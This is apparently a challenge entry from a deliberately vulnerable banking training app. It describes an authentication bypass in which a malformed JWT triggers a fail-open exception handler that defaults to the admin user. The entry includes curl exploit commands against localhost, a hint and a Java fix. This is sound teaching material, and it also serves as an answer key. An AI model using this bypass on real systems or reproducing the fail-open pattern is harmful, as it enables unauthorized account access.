  - id: 25
    category: A10
    categoryName: Mishandling of Exceptional Conditions
    title: "Insecure Fallback: Auth Bypass on Exception"
    severity: High
    objective: >-
      Send a malformed JWT to trigger the `except` fallback and get admin access.
    exploit: |
      ```bash
      # Send a deliberately malformed token (not even valid base64)
      curl -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
        http://localhost:8080/api/a10/transfers/history
      ```
      The decode raises `JwtException`, the bare `except` swallows it, `user_id`
      defaults to `1` (admin), and the response returns all transfers as admin.

      ```bash
      # Confirm: garbage token vs. no token
      curl http://localhost:8080/api/a10/transfers/history                          # 401
      curl -H "Authorization: Bearer garbage" http://localhost:8080/api/a10/transfers/history   # 200 as admin!
      ```
    hint: >-
      Compare the two responses above. Which one is more dangerous?
    fix: >-
      Replace the fallback with an explicit rejection:

      ```java
      try {
          payload = jwtService.decode(token);
          userId = payload.userId();
      } catch (io.jsonwebtoken.JwtException e) {
          return ResponseEntity.status(401).body(Map.of("error", "Invalid token"));
      }
      ```

      Never fail open. Exceptions in authentication logic must always fail closed.
    source: core/src/main/java/com/securebank/core/security/AuthFilter.java
    anchors:
      - "Long userId = 1L;"
